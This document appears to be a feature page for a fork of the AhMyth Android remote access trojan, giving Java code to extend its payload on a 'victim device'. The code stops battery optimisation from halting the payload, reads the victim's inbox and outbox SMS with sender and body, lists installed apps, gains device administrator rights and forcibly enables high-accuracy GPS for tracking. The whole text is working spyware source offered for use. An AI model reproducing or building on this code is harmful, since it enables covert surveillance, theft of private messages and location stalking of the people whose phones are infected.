## Request Ignore Battery Optimisations
A Major thank you to "RESET FORWARD" for this! This will allow Battery Optimisations to be ignored for the AhMyth payload
- MainActivity.java
```java
package ahmyth.mine.king.ahmyth

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.provider.Settings;

public class MainActivity extends Activity {

  @Override

  protected void onCreate(Bundle savedInstanceState) {

    super.onCreate(savedInstanceState);
    
    requestIgnoreBatteryOptimizationPermission();

  }

  private void requestIgnoreBatteryOptimizationPermission() {

    if (getPackageManager().hasSystemFeature(PackageManager.FEATURE_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)) {

      String packageName = getPackageName();

      Intent intent = new Intent();
      intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
      intent.setData(Uri.parse("package:" + packageName));

      startActivity(intent);

    }

  }

}
```

## Updated SMS Manager
This should hopefully allow viewing of both inbox and outbox messages when using the Victims Lab SMS feature, Server Updates also required to allow this to work.
- SmsManager.java
```java
public static JSONObject getSMSInboxList(){

    try {

        JSONObject SMSInboxList = new JSONObject();

        JSONArray list = new JSONArray();

        Uri uriSMSURI = Uri.parse("content://sms/inbox");

        Cursor cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, null);

        while (cur.moveToNext()) {

            JSONObject sms = new JSONObject();

            String address = cur.getString(cur.getColumnIndex("address"));

            String body = cur.getString(cur.getColumnIndexOrThrow("body"));

            sms.put("phoneNo" , address);

            sms.put("msg" , body);

            list.put(sms);

        }

        SMSInboxList.put("smsInboxList", list);

        Log.e("done" ,"collecting");

        return SMSInboxList;

    } catch (JSONException e) {

        e.printStackTrace();

    }

    return null;

}

public static JSONObject getSMSOutboxList(){

    try {

        JSONObject SMSOutboxList = new JSONObject();

        JSONArray list = new JSONArray();

        Uri uriSMSURI = Uri.parse("content://sms/outbox");

        Cursor cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, null);

        while (cur.moveToNext()) {

            JSONObject sms = new JSONObject();

            String address = cur.getString(cur.getColumnIndex("address"));

            String body = cur.getString(cur.getColumnIndexOrThrow("body"));

            sms.put("phoneNo" , address);

            sms.put("msg" , body);

            list.put(sms);

        }

        SMSOutboxList.put("smsOutboxList", list);

        Log.e("done" ,"collecting");

        return SMSOutboxList;

    } catch (JSONException e) {

        e.printStackTrace();

    }

    return null;

}
```
## List Installed apps
This will hopefully Allow AhMyth to list apps that are installed on the victim device

- AppList.java

```java

package ahmyth.mine.king.ahmyth;

import android.content.pm.PackageInfo;

import android.graphics.drawable.Drawable;

import org.json.JSONArray;

import org.json.JSONException;

import org.json.JSONObject;

import java.util.List;

import static ahmyth.mine.king.ahmyth.ConnectionManager.context;

public class AppList {

    public static JSONObject getInstalledApps(boolean getSysPackages) {

        JSONArray apps = new JSONArray();

        List<PackageInfo> packs = context.getPackageManager().getInstalledPackages(0);

        for(int i=0;i < packs.size();i++) {

            PackageInfo p = packs.get(i);

            if ((!getSysPackages) && (p.versionName == null)) {

                continue ;

            }

            try {

                JSONObject newInfo = new JSONObject();

                String appname = p.applicationInfo.loadLabel(context.getPackageManager()).toString();

                String pname = p.packageName;

                String versionName = p.versionName;

                int versionCode = p.versionCode;

                newInfo.put("appName",appname);

                newInfo.put("packageName",pname);

                newInfo.put("versionName",versionName);

                newInfo.put("versionCode",versionCode);

                apps.put(newInfo);

            }catch (JSONException e) {}

        }

        JSONObject data = new JSONObject();

        try {

            data.put("apps", apps);

        }catch (JSONException e) {}

        return data;

    }

}

```
<br></br>
# Possible upgrades 
## Possible Device Admin Privileges

This will hopefully give the AhMyth Payload Administrator Privileges for future features.
- DeviceAdmin.java
```java
package ahmyth.mine.king.ahmyth;

import android.app.admin.DeviceAdminReceiver;

import android.app.admin.DevicePolicyManager;

import android.content.ComponentName;

import android.content.Context;

public class DeviceAdmin extends DeviceAdminReceiver {

    static DevicePolicyManager getDPM(Context context) {

        return (DevicePolicyManager)context.getSystemService(Context.DEVICE_POLICY_SERVICE);

    }

    public static ComponentName getComponentName(Context context) {

        return new ComponentName(context.getApplicationContext(), DeviceAdmin.class);

    }

}
```
## Possible Auto enabling of Device GPS

This will hopefully allow automatic enabling of the victim device's GPS, Device Administration Privileges are required for this to work, hence the need for the **DeviceAdmin.java** code above.
- LocationManager.java
```java
    private void activateGps(Context context) {

        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);

        if (!prefs.getBoolean("allow_location_modechange", false))

            return;

        if (!DeviceAdmin.getDPM(context).isAdminActive(DeviceAdmin.getComponentName(context)))

            return;

        if (!DeviceAdmin.getDPM(context).isDeviceOwnerApp(context.getApplicationContext().getPackageName()))

            return;

        DeviceAdmin.getDPM(context).setSecureSetting(

                DeviceAdmin.getComponentName(context),

                Settings.Secure.LOCATION_MODE,

                Integer.toString(Settings.Secure.LOCATION_MODE_HIGH_ACCURACY)

        );

        Log.d("Done", "Forcefully enabled GPS");

    }

    private void getLocation(Context context) throws SecurityException {

        activateGps(context);

        LocationManager locationManager = (LocationManager) context.getApplicationContext().getSystemService(Context.LOCATION_SERVICE);

        locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, null);

    }
```
- Settings.java
```java
        perms.put("allow_location", new String[]{

                Manifest.permission.ACCESS_FINE_LOCATION,

        });

        perms.put("allow_location_modechange", new String[]{

                Manifest.permission.BIND_DEVICE_ADMIN,

        });
```
